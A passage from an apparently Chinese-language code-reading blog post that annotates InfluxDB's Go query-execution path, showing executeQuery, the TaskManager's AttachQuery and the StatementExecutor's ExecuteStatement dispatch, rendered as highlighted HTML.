class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(e *Executor)</span> <span class="title">executeQuery</span><span class="params">(query *influxql.Query, opt ExecutionOptions, closing &lt;-<span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;, results <span class="keyword">chan</span> *Result)</span></span> &#123;</span><br><span class="line"><span class="keyword">defer</span> <span class="built_in">close</span>(results)</span><br><span class="line"><span class="keyword">defer</span> e.<span class="built_in">recover</span>(query, results)</span><br><span class="line"></span><br><span class="line">atomic.AddInt64(&amp;e.stats.ActiveQueries, <span class="number">1</span>)</span><br><span class="line">atomic.AddInt64(&amp;e.stats.ExecutedQueries, <span class="number">1</span>)</span><br><span class="line"><span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">(start time.Time)</span></span> &#123;</span><br><span class="line">atomic.AddInt64(&amp;e.stats.ActiveQueries, <span class="number">-1</span>)</span><br><span class="line">atomic.AddInt64(&amp;e.stats.FinishedQueries, <span class="number">1</span>)</span><br><span class="line">atomic.AddInt64(&amp;e.stats.QueryExecutionDuration, time.Since(start).Nanoseconds())</span><br><span class="line">&#125;(time.Now())</span><br><span class="line"><span class="comment">// 使用taskManager来管理查询query,返回一个channel，当query完成running的时候。</span></span><br><span class="line">ctx, detach, err := e.TaskManager.AttachQuery(query, opt, closing)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line"><span class="keyword">case</span> results &lt;- &amp;Result&#123;Err: err&#125;:</span><br><span class="line"><span class="keyword">case</span> &lt;-opt.AbortCh:</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> detach()</span><br><span class="line"></span><br><span class="line"><span class="comment">// Setup the execution context that will be used when executing statements.</span></span><br><span class="line">ctx.Results = results</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> i <span class="keyword">int</span></span><br><span class="line">LOOP:</span><br><span class="line"><span class="keyword">for</span> ; i &lt; <span class="built_in">len</span>(query.Statements); i++ &#123;</span><br><span class="line">ctx.statementID = i</span><br><span class="line">stmt := query.Statements[i]</span><br><span class="line"></span><br><span class="line"><span class="comment">// If a default database wasn't passed in by the caller, check the statement.</span></span><br><span class="line">defaultDB := opt.Database</span><br><span class="line"><span class="keyword">if</span> defaultDB == <span class="string">""</span> &#123;</span><br><span class="line"><span class="keyword">if</span> s, ok := stmt.(influxql.HasDefaultDatabase); ok &#123;</span><br><span class="line">defaultDB = s.DefaultDatabase()</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Do not let queries manually use the system measurements. If we find</span></span><br><span class="line"><span class="comment">// one, return an error. This prevents a person from using the</span></span><br><span class="line"><span class="comment">// measurement incorrectly and causing a panic.</span></span><br><span class="line"><span class="keyword">if</span> stmt, ok := stmt.(*influxql.SelectStatement); ok &#123;</span><br><span class="line"><span class="keyword">for</span> _, s := <span class="keyword">range</span> stmt.Sources &#123;</span><br><span class="line"><span class="keyword">switch</span> s := s.(<span class="keyword">type</span>) &#123;</span><br><span class="line"><span class="keyword">case</span> *influxql.Measurement:</span><br><span class="line"><span class="keyword">if</span> influxql.IsSystemName(s.Name) &#123;</span><br><span class="line">command := <span class="string">"the appropriate meta command"</span></span><br><span class="line"><span class="keyword">switch</span> s.Name &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">"_fieldKeys"</span>:</span><br><span class="line">command = <span class="string">"SHOW FIELD KEYS"</span></span><br><span class="line"><span class="keyword">case</span> <span class="string">"_measurements"</span>:</span><br><span class="line">command = <span class="string">"SHOW MEASUREMENTS"</span></span><br><span class="line"><span class="keyword">case</span> <span class="string">"_series"</span>:</span><br><span class="line">command = <span class="string">"SHOW SERIES"</span></span><br><span class="line"><span class="keyword">case</span> <span class="string">"_tagKeys"</span>:</span><br><span class="line">command = <span class="string">"SHOW TAG KEYS"</span></span><br><span class="line"><span class="keyword">case</span> <span class="string">"_tags"</span>:</span><br><span class="line">command = <span class="string">"SHOW TAG VALUES"</span></span><br><span class="line">&#125;</span><br><span class="line">results &lt;- &amp;Result&#123;</span><br><span class="line">Err: fmt.Errorf(<span class="string">"unable to use system source '%s': use %s instead"</span>, s.Name, command),</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span> LOOP</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Rewrite statements, if necessary.</span></span><br><span class="line"><span class="comment">// This can occur on meta read statements which convert to SELECT statements.</span></span><br><span class="line">newStmt, err := RewriteStatement(stmt)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">results &lt;- &amp;Result&#123;Err: err&#125;</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line">stmt = newStmt</span><br><span class="line"></span><br><span class="line"><span class="comment">// Normalize each statement if possible.</span></span><br><span class="line"><span class="keyword">if</span> normalizer, ok := e.StatementExecutor.(StatementNormalizer); ok &#123;</span><br><span class="line"><span class="keyword">if</span> err := normalizer.NormalizeStatement(stmt, defaultDB, opt.RetentionPolicy); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">if</span> err := ctx.send(&amp;Result&#123;Err: err&#125;); err == ErrQueryAborted &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Log each normalized statement.</span></span><br><span class="line"><span class="keyword">if</span> !ctx.Quiet &#123;</span><br><span class="line">e.Logger.Info(<span class="string">"Executing query"</span>, zap.Stringer(<span class="string">"query"</span>, stmt))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Send any other statements to the underlying statement executor.</span></span><br><span class="line">err = e.StatementExecutor.ExecuteStatement(stmt, ctx)</span><br><span class="line"><span class="keyword">if</span> err == ErrQueryInterrupted &#123;</span><br><span class="line"><span class="comment">// Query was interrupted so retrieve the real interrupt error from</span></span><br><span class="line"><span class="comment">// the query task if there is one.</span></span><br><span class="line"><span class="keyword">if</span> qerr := ctx.Err(); qerr != <span class="literal">nil</span> &#123;</span><br><span class="line">err = qerr</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Send an error for this result if it failed for some reason.</span></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">if</span> err := ctx.send(&amp;Result&#123;</span><br><span class="line">StatementID: i,</span><br><span class="line">Err:         err,</span><br><span class="line">&#125;); err == ErrQueryAborted &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Stop after the first error.</span></span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check if the query was interrupted during an uninterruptible statement.</span></span><br><span class="line">interrupted := <span class="literal">false</span></span><br><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line"><span class="keyword">case</span> &lt;-ctx.Done():</span><br><span class="line">interrupted = <span class="literal">true</span></span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="comment">// Query has not been interrupted.</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> interrupted &#123;</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Send error results for any statements which were not executed.</span></span><br><span class="line"><span class="keyword">for</span> ; i &lt; <span class="built_in">len</span>(query.Statements)<span class="number">-1</span>; i++ &#123;</span><br><span class="line"><span class="keyword">if</span> err := ctx.send(&amp;Result&#123;</span><br><span class="line">StatementID: i,</span><br><span class="line">Err:         ErrNotExecuted,</span><br><span class="line">&#125;); err == ErrQueryAborted &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数AttachQuery用于管理当前查询的query的状态</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// AttachQuery attaches a running query to be managed by the TaskManager.</span></span><br><span class="line"><span class="comment">// Returns the query id of the newly attached query or an error if it was</span></span><br><span class="line"><span class="comment">// unable to assign a query id or attach the query to the TaskManager.</span></span><br><span class="line"><span class="comment">// This function also returns a channel that will be closed when this</span></span><br><span class="line"><span class="comment">// query finishes running.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// After a query finishes running, the system is free to reuse a query id.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(t *TaskManager)</span> <span class="title">AttachQuery</span><span class="params">(q *influxql.Query, opt ExecutionOptions, interrupt &lt;-<span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;)</span> <span class="params">(*ExecutionContext, <span class="keyword">func</span>()</span>, <span class="title">error</span>)</span> &#123;</span><br><span class="line">t.mu.Lock()</span><br><span class="line"><span class="keyword">defer</span> t.mu.Unlock()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> t.shutdown &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, <span class="literal">nil</span>, ErrQueryEngineShutdown</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> t.MaxConcurrentQueries &gt; <span class="number">0</span> &amp;&amp; <span class="built_in">len</span>(t.queries) &gt;= t.MaxConcurrentQueries &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, <span class="literal">nil</span>, ErrMaxConcurrentQueriesLimitExceeded(<span class="built_in">len</span>(t.queries), t.MaxConcurrentQueries)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">qid := t.nextID</span><br><span class="line">    <span class="comment">//初始化task</span></span><br><span class="line">query := &amp;Task&#123;</span><br><span class="line">query:     q.String(),</span><br><span class="line">database:  opt.Database,</span><br><span class="line">status:    RunningTask,</span><br><span class="line">startTime: time.Now(),</span><br><span class="line">closing:   <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;),</span><br><span class="line">monitorCh: <span class="built_in">make</span>(<span class="keyword">chan</span> error),</span><br><span class="line">&#125;</span><br><span class="line">t.queries[qid] = query</span><br><span class="line"></span><br><span class="line"><span class="keyword">go</span> t.waitForQuery(qid, query.closing, interrupt, query.monitorCh)<span class="comment">//开启协程来监听query是否结束。</span></span><br><span class="line"><span class="keyword">if</span> t.LogQueriesAfter != <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">go</span> query.monitor(<span class="function"><span class="keyword">func</span><span class="params">(closing &lt;-<span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">timer := time.NewTimer(t.LogQueriesAfter)<span class="comment">//检测到慢查询的时候，报警。</span></span><br><span class="line"><span class="keyword">defer</span> timer.Stop()</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line"><span class="keyword">case</span> &lt;-timer.C:</span><br><span class="line">t.Logger.Warn(fmt.Sprintf(<span class="string">"Detected slow query: %s (qid: %d, database: %s, threshold: %s)"</span>,</span><br><span class="line">query.query, qid, query.database, t.LogQueriesAfter))</span><br><span class="line"><span class="keyword">case</span> &lt;-closing:</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line">t.nextID++</span><br><span class="line">    <span class="comment">//初始化一个ctx上下文</span></span><br><span class="line">ctx := &amp;ExecutionContext&#123;</span><br><span class="line">Context:          context.Background(),</span><br><span class="line">QueryID:          qid,</span><br><span class="line">task:             query,</span><br><span class="line">ExecutionOptions: opt,</span><br><span class="line">&#125;</span><br><span class="line">ctx.watch()</span><br><span class="line">   <span class="comment">// detach query，从查询table中去除。</span></span><br><span class="line"><span class="keyword">return</span> ctx, <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123; t.DetachQuery(qid) &#125;, <span class="literal">nil</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将解析出来的statement执行函数ExecuteStatement</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ExecuteStatement executes the given statement with the given execution context.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(e *StatementExecutor)</span> <span class="title">ExecuteStatement</span><span class="params">(stmt influxql.Statement, ctx *query.ExecutionContext)</span> <span class="title">error</span></span> &#123;</span><br><span class="line"><span class="comment">// Select statements are handled separately so that they can be streamed.</span></span><br><span class="line">    <span class="comment">//特殊处理select查询</span></span><br><span class="line"><span class="keyword">if</span> stmt, ok := stmt.(*influxql.SelectStatement); ok &#123;</span><br><span class="line"><span class="keyword">return</span> e.executeSelectStatement(stmt, ctx)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> rows models.Rows</span><br><span class="line"><span class="keyword">var</span> messages []*query.Message</span><br><span class="line"><span class="keyword">var</span> err error</span><br><span class="line"><span class="keyword">switch</span> stmt := stmt.(<span class="keyword">type</span>) &#123;</span><br><span class="line">     <span class="comment">//根据每个类别分别处理不同type的查询语句，有点多，自己看下吧~~~</span></span><br><span class="line"><span class="keyword">case</span> *influxql.AlterRetentionPolicyStatement:</span><br><span class="line"><span class="keyword">if</span> ctx.ReadOnly &#123;</span><br><span class="line">messages = <span class="built_in">append</span>(messages, query.ReadOnlyWarning(stmt.String()))</span><br><span class="line">&#125;</span><br><span class="line">err = e.executeAlterRetentionPolicyStatement(stmt)</span><br><span class="line"><span class="keyword">case</span> *influxql.CreateContinuousQueryStatement:</span><br><span class="line"><span class="keyword">if</span> ctx.ReadOnly &#123;</span><br><span class="line">messages = <span class="built_in">append</span>(messages, query.ReadOnlyWarning(stmt.String()))</span><br><span class="line">&#125;</span><br><span class="line">err = e.executeCreateContinuousQueryStatement(stmt)</span><br><span class="line"><span class="keyword">case</span> *influxql.CreateDatabaseStatement:</span><br><span class="line"><span class="keyword">if</span> ctx.ReadOnly &#123;</span><br><span class="line">messages = <span class="built_in">append</span>(messages, query.ReadOnlyWarning(stmt.String()))</span><br><span class="line">&#125;</span><br><span class="line">err = e.executeCreateDatabaseStatement(stmt)</span><br><span class="line"><span class="keyword">case</span> *influxql.CreateRetentionPolicyStatement:</span><br><span class="line"><span class="keyword">if</span> ctx.ReadOnly &#123;</span><br><span class="line">messages = <span class="built_in">append</span>(messages, query.ReadOnlyWarning(stmt.String()))</span><br><span class="line">&#125;</span><br><span class="line">err = e.executeCreateRetentionPolicyStatement(stmt)</span><br><span class="line"><span class="keyword">case</span> *influxql.CreateSubscriptionStatement:</span><br><span class="line"><span class="keyword">if</span> ctx.ReadOnly &#123;</span><br><span class="line">messages = <span class="built_in">append</span>(messages, query.ReadOnlyWarning(stmt.String()))</span><br><span class="line">&#125;</span><br><span class="line">err = e.executeCreateSubscriptionStatement(stmt)</span><br><span class="line"><span class="keyword">case</span> *influxql.CreateUserStatement:</span><br><span class="line"><span class="keyword">if</span> ctx.ReadOnly &#123;</span><br><span class="line">messages = <span class="built_in">append</span>(messages, query.ReadOnlyWarning(stmt.String()))</span><br><span class="line">&#125;</span><br><span class="line">err = e.executeCreateUserStatement(stmt)</span><br><span class="line"><span class="keyword">case</span> *influxql.DeleteSeriesStatement:</span><br><span class="line">err = e.executeDeleteSeriesStatement(stmt, ctx.Database)</span><br><span class="line"><span class="keyword">case</span> *influxql.DropContinuousQueryStatement:</span><br><span class="line"><span class="keyword">if</span> ctx.ReadOnly &#123;</span><br><span class="line">messages = <span class="built_in">append</span>(messages, query.ReadOnlyWarning(stmt.String()))</span><br><span class="line">&#125;</span><br><span class="line">err = e.executeDropContinuousQueryStatement(stmt)</span><br><span class="line"><span class="keyword">case</span> *influxql.DropDatabaseStatement:</span><br><span class="line"><span class="keyword">if</span> ctx.ReadOnly &#123;</span><br><span class="line">messages = <span class="built_in">append</span>(messages, query.ReadOnlyWarning(stmt.String()))</span><br><span class="line">&#125;</span><br><span class="line">err = e.executeDropDatabaseStatement(stmt)</span><br><span class="line"><span class="keyword">case</span> *influxql.DropMeasurementStatement:</span><br><span class="line"><span class="keyword">if</span> ctx.ReadOnly &#123;</span><br><span class="line">messages = <span class="built_in">append</span>(messages, query.ReadOnlyWarning(stmt.String()))</span><br><span class="line">&#125;</span><br><span class="line">err = e.executeDropMeasurementStatement(stmt, ctx.Database)</span><br><span class="line"><span class="keyword">case</span> *influxql.DropSeriesStatement:</span><br><span class="line"><span class="keyword">if</span> ctx.ReadOnly &#123;</span><br><span class="line">messages = <span class="built_in">append</span>(messages, query.ReadOnlyWarning(stmt.String()))</span><br><span class="line">&#125;</span><br><span class="line">err = e.executeDropSeriesStatement(stmt, ctx.Database)</span><br><span class="line"><span class="keyword">case</span> *influxql.DropRetentionPolicyStatement:</span><br><span class="line"><span class="keyword">if</span> ctx.ReadOnly &#123;</span><br><span class="line">messages = <span class="built_in">append</span>(messages, query.ReadOnlyWarning(stmt.String()))</span><br><span class="line">&#125;</span><br><span class="line">err = e.executeDropRetentionPolicyStatement(stmt)</span><br><span class="line"><span class="keyword">case</span> *influxql.DropShardStatement:</span><br><span class="line"><span class="keyword">if</span> ctx.ReadOnly &#123;</span><br><span class="line">messages = <span class="built_in">append</span>(messages, query.ReadOnlyWarning(stmt.String()))</span><br><span class="line">&#125;</span><br><span class="line">err = e.executeDropShardStatement(stmt)</span><br><span class="line"><span class="keyword">case</span> *influxql.DropSubscriptionStatement:</span><br><span class="line"><span class="keyword">if</span> ctx.ReadOnly &#123;</span><br><span class="line">messages = <span class="built_in">append</span>(messages, query.ReadOnlyWarning(stmt.String()))</span><br><span class="line">&#125;</span><br><span class="line">err = e.executeDropSubscriptionStatement(stmt)</span><br><span class="line"><span class="keyword">case</span> *influxql.DropUserStatement:</span><br><span class="line"><span class="keyword">if</span> ctx.ReadOnly &#123;</span><br><span class="line">messages = <span class="built_in">append</span>(messages, query.ReadOnlyWarning(stmt.String()))</span><br><span class="line">&#125;</span><br><span class="line">err = e.executeDropUserStatement(stmt)</span><br><span class="line"><span class="keyword">case</span> *influxql.ExplainStatement:</span><br><span class="line"><span class="keyword">if</span> stmt.Analyze &#123;</span><br><span class="line">rows, err = e.executeExplainAnalyzeStatement(stmt, ctx)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">rows, err = e.executeExplainStatement(stmt, ctx)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> *influxql.GrantStatement:</span><br><span class="line"><span class="keyword">if</span> ctx.ReadOnly &#123;</span><br><span class="line">messages = <span class="built_in">append</span>(messages, query.ReadOnlyWarning(stmt.String()))</span><br><span class="line">&#125;</span><br><span class="line">err = e.executeGrantStatement(stmt)</span><br><span class="line"><span class="keyword">case</span> *influxql.GrantAdminStatement:</span><br><span class="line"><span class="keyword">if</span> ctx.ReadOnly &#123;</span><br><span class="line">messages = <span class="built_in">append</span>(messages, query.ReadOnlyWarning(stmt.String()))</span><br><span class="line">&#125;</span><br><span class="line">err = e.executeGrantAdminStatement(stmt)</span><br><span class="line"><span class="keyword">case</span> *influxql.RevokeStatement:</span><br><span class="line"><span class="keyword">if</span> ctx.ReadOnly &#123;</span><br><span class="line">messages = <span class="built_in">append</span>(messages, query.ReadOnlyWarning(stmt.String()))</span><br><span class="line">&#125;</span><br><span class="line">err = e.executeRevokeStatement(stmt)</span><br><span class="line"><span class="keyword">case</span> *influxql.RevokeAdminStatement:</span><br><span class="line"><span class="keyword">if</span> ctx.ReadOnly &#123;</span><br><span class="line">messages = <span class="built_in">append</span>(messages, query.ReadOnlyWarning(stmt.String()))</span><br><span class="line">&#125;</span><br><span class="line">err = e.executeRevokeAdminStatement(stmt)</span><br><span class="line"><span class="keyword">case</span> *influxql.ShowContinuousQueriesStatement:</span><br><span class="line">rows, err = e.executeShowContinuousQueriesStatement(stmt)</span><br><span class="line"><span class="keyword">case</span> *influxql.ShowDatabasesStatement:</span><br><span class="line">rows, err = e.executeShowDatabasesStatement(stmt, ctx)</span><br><span class="line"><span class="keyword">case</span> *influxql.ShowDiagnosticsStatement:</span><br><span class="line">rows, err = e.executeShowDiagnosticsStatement(stmt)</span><br><span class="line"><span class="keyword">case</span> *influxql.ShowGrantsForUserStatement:</span><br><span class="line">rows, err = e.executeShowGrantsForUserStatement(stmt)</span><br><span class="line"><span class="keyword">case</span> *influxql.ShowMeasurementsStatement:</span><br><span class="line"><span class="keyword">return</span> e.executeShowMeasurementsStatement(stmt, ctx)</span><br><span class="line"><span class="keyword">case</span> *influxql.ShowMeasurementCardinalityStatement:</span><br><span class="line">rows, err = e.executeShowMeasurementCardinalityStatement(stmt)</span><br><span class="line"><span class="keyword">case</span> *influxql.ShowRetentionPoliciesStatement:</span><br><span class="line">rows, err = e.executeShowRetentionPoliciesStatement(stmt)</span><br><span class="line"><span class="keyword">case</span> *influxql.ShowSeriesCardinalityStatement:</span><br><span class="line">rows, err = e.executeShowSeriesCardinalityStatement(stmt)</span><br><span class="line"><span class="keyword">case</span> *influxql.ShowShardsStatement:</span><br><span class="line">rows, err = e.executeShowShardsStatement(stmt)</span><br><span class="line"><span class="keyword">case</span> *influxql.ShowShardGroupsStatement:</span><br><span class="line">rows, err = e.executeShowShardGroupsStatement(stmt)</span><br><span class="line"><span class="keyword">case</span> *influxql.ShowStatsStatement:</span><br><span class="line">rows, err = e.executeShowStatsStatement(stmt)</span><br><span class="line"><span class="keyword">case</span> *influxql.ShowSubscriptionsStatement:</span><br><span class="line">rows, err = e.executeShowSubscriptionsStatement(stmt)</span><br><span class="line"><span class="keyword">case</span> *influxql.ShowTagKeysStatement:</span><br><span class="line"><span class="keyword">return</span> e.executeShowTagKeys(stmt, ctx)</span><br><span class="line"><span class="keyword">case</span> *influxql.ShowTagValuesStatement:</span><br><span class="line"><span class="keyword">return</span> e.executeShowTagValues(stmt, ctx)</span><br><span class="line"><span class="keyword">case</span> *influxql.ShowUsersStatement:</span><br><span class="line">rows, err = e.executeShowUsersStatement(stmt)</span><br><span class="line"><span class="keyword">case</span> *influxql.SetPasswordUserStatement:</span><br><span class="line"><span class="keyword">if</span> ctx.ReadOnly &#123;</span><br><span class="line">messages = <span class="built_in">append</span>(messages, query.ReadOnlyWarning(stmt.String()))</span><br><span class="line">&#125;</span><br><span class="line">err = e.executeSetPasswordUserStatement(stmt)</span><br><span class="line"><span class="keyword">case</span> *influxql.ShowQueriesStatement, *influxql.KillQueryStatement:</span><br><span class="line"><span class="comment">// Send query related statements to the task manager.</span></span><br><span class="line"><span class="keyword">return</span> e.TaskManager.ExecuteStatement(stmt, ctx)</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">return</span> query.ErrInvalidQuery</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ctx.Send(&amp;query.Result&#123;</span><br><span class="line">Series:   rows,</span><br><span class="line">Messages: messages,</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>针对不同类型的statment执行不同的查询tsdb过程。以select查询为例。，executeSelectStatement单独处理，为了能够streamed。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 